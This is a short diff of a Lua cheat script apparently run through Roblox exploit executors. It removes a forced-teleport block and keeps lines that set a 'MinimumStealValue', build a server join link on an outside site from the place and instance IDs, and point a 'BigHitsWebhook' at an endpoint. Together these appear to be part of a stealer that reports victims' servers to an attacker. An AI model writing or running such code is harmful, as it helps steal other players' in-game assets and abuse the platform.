@@ -34,17 +34,7 @@ if SHALL_SERVERHOP and not table.find({"delta","krnl"}, identifyexecutor():lower
 	ServerHop()
 	return
 end;
-if table.find({"delta"}, identifyexecutor():lower()) and not getgenv().abcdefg then
-    game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
-        queue_on_teleport([[getgenv().abcdefg = "]]..v.ServerInstanceId..[[";]])
-    end)
-    for _ = 1, 2 do
-        task.spawn(function()
-            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, fuckassjobid)
-        end)
-        task.wait()
-    end
-end
+
 MinimumStealValue = 1;
 ROBLOX_JOIN_CLICK_URL = 'https://fern.wtf/joiner?placeId=' .. game.PlaceId .. '&gameInstanceId=' .. fuckassjobid;
 Webhook = BigHitsWebhook;
